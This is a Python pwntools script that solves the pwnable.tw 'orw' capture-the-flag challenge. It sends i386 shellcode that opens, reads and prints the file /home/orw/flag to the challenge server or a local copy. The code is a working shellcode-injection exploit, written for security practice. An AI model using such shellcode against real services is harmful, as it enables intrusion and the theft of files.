#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./orw")
#libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10001)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            """)
        else:
            p = process([exe.path])
    return p


def main():
    p = conn()

    #payload = asm("xor eax, eax")
    #payload += asm("push eax")
    payload = asm(shellcraft.i386.linux.open('/home/orw/flag', 0))
    payload += asm(shellcraft.i386.linux.read('eax', 'esp', 0x100))
    payload += asm(shellcraft.i386.linux.write(1, 'esp', 'eax'))
    payload += asm(shellcraft.i386.linux.exit(0))
    p.send(payload)

    p.interactive()


if __name__ == "__main__":
    main()
